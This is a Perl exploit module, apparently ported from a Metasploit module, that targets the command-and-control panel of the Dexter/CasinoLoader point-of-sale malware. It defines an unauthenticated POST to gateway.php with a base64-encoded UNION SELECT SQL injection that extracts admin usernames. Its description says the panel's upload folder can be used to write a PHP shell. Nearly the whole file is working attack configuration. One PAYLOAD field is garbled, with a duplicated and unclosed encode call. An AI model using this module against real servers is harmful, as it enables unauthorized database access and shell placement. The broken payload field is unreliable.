package DEXTER::MSF::DexterCasinoloaderExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "DexterCasinoloaderExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "DESCRIPTION" => "

          This module exploits a vulnerability found in the command and control panel

        used to control Dexter (Point of Sale malware).  This is done by accessing the

        PHP page used by bots to report in (gateway.php) which does not sanitize input.

        Input is encrypted and encoded, but the key is supplied by the bot connecting.

        The 'page' parameter is used in this case.  The command and control panel designates

        a location to upload files, and can be used as a reliable location to write a

        PHP shell.  Authentication is not needed to exploit this vulnerability.

      ",
  "METHOD" => "POST",
  "MSF_MODULE" => "dexter_casinoloader_exec",
  "PATHS" => [""],
  "PAYLOAD" => "val=AA==&page=Rex::Text.encode_base64(AND1=2UNIONALLSELECT1&val=AA==&page=Rex::Text.encode_base64(AND1=2UNIONALLSELECT1&submit=1&username=__USERNAME__&password=__PASSWORD__&",
  "TITLE OF BOT GATEWAY PAGE" => "gateway.php",
  "TITLE OF PANEL LOGIN PAGE" => "index.php",
  "TITLE OF PANEL UPLOAD PAGE" => "upload.php",
  "USERS" => "name",
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "The path to the CasinoLoader root folder",
  VALUE => "/",
},
    'USERNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'TARGETDATABASEUSERTABLE' =>       {
  DESCRIPTION => "Table in database that holds admin data",
  VALUE => "users",
},
    'PASSWORD' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'gateway.php',
      PAYLOAD      => 'val=AA%3d%3d&page=JyBBTkQgMT0yIFVOSU9OIEFMTCBTRUxFQ1QgMSxuYW1lLDMgRlJPTSB1c2VycyBMSU1JVCAxIE9GRlNFVCAwIC0tIC0t',
      TEXT   => 'Sending Exploit #1 Request : [POST] /gateway.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
